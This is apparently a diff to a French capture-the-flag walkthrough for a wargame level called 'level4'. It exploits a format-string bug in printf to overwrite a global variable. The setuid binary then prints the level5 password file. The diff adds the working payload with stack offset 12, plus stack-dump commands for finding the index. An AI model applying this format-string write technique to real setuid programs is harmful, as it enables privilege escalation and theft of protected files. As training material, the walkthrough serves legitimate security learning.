@@ -30,7 +30,13 @@ Voir `analysis.md`.
 
 Vulnérabilité **format string** : `printf(buffer)`. La variable **m** (0x8049810) doit valoir **0x1025544** (16930116) pour que soit exécuté **system("/bin/cat /home/user/level5/.pass")**.
 
-Si tu as un **segfault** avec tous les payloads, c’est que l’index **k** dans **%k$n** est mauvais : on écrit alors 16930116 sur la stack au lieu de 0x8049810.
+**Solution validée (ISO officielle, index 12) :**
+
+```bash
+python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' | ./level4
+```
+
+Attendre 10–30 s ; le mot de passe level5 s’affiche à la fin. Si sur une autre VM l’index est différent, voir ci‑dessous.
 
 ### 0. Sur l’ISO officielle : vérifier l’adresse de `m`
 
@@ -44,15 +50,15 @@ readelf -s level4 | grep " m "
 
 Noter l’adresse (ex. `08049810`). En little endian : si c’est 0x8049810 → `\x10\x98\x04\x08` ; si c’est 0x8049890 → `\x90\x98\x04\x08`, etc.
 
-### 1. Trouver le bon index (obligatoire en cas de segfault)
+### 1. Trouver le bon index
 
-**Étape A — Dump de la stack**
+**Dump de la stack** (étendre jusqu’à 12 si besoin) :
 
 ```bash
-python -c 'print "AAAA" + "%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p"' | ./level4
+python -c 'print "AAAA" + "%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p.%9$p.%10$p.%11$p.%12$p"' | ./level4
 ```
 
-Ce sont des adresses (pas 0x41414141). Le buffer est souvent une des adresses **stack** (0xbffffxxx) : dans ton dump, **%2$p** = 0xbffff794, **%6$p** = 0xbffff758, **%8$p** = 0xbffff550. Si **%1$n** segfault, tester **2**, **6**, **8**.
+Repérer l’index qui affiche **0x41414141** (les "AAAA") : c’est le pointeur sur le buffer. Sur l’ISO officielle c’est **%12$p** → utiliser **%12$n**.
 
 **Étape B — Vérifier avec une petite écriture (évite le segfault)**
 
@@ -82,14 +88,15 @@ python -c 'print "\x10\x98\x04\x08" + "%16930112x%K$n"' | ./level4 > /tmp/out 2>
 tail -1 /tmp/out
 ```
 
-Sur l’ISO officielle, les index **2** et **8** ne segfaultent pas (test avec `%60x%K$n`). Tester le **payload complet** avec **8** puis avec **2** — l’un des deux doit faire exécuter `system("/bin/cat /home/user/level5/.pass")` par le binaire (setuid level5), ce qui affiche le mot de passe. Tu ne peux pas lire le fichier à la main (Permission denied en level4).
+Si le dump montre **0x41414141** à un certain index (ex. **%12$p**), cet index est le **pointeur sur le buffer** : utilise **%12$n** (remplace 12 par l’index trouvé). Sur l’ISO officielle le buffer peut être à l’index **12**. Tester le **payload complet** avec cet index — l’un des deux doit faire exécuter `system("/bin/cat /home/user/level5/.pass")` par le binaire (setuid level5), ce qui affiche le mot de passe. Tu ne peux pas lire le fichier à la main (Permission denied en level4).
+
+**Ton dump : %12$p = 0x41414141** → le buffer est à l’index **12**. Utilise **%12$n** :
 
 ```bash
-# Avec l’index 8 (attendre 10–30 s, le mot de passe s’affiche à la fin)
-python -c 'print "\x10\x98\x04\x08" + "%16930112x%8$n"' | ./level4
+python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' | ./level4
 ```
 
-Si la fin de la sortie n’est pas le mot de passe (64 caractères hex), essayer avec l’index **2**. Si ni 8 ni 2 ne donnent le mot de passe, tenter l’écriture en **deux fois** avec **%hn** (voir ci‑dessous).
+(Attendre 10–30 s. Le mot de passe level5 à la fin.) Si besoin, essayer aussi **%8$n** ou **%2$n**. Si ni 8 ni 2 ne donnent le mot de passe, tenter l’écriture en **deux fois** avec **%hn** (voir ci‑dessous).
 
 ---
 
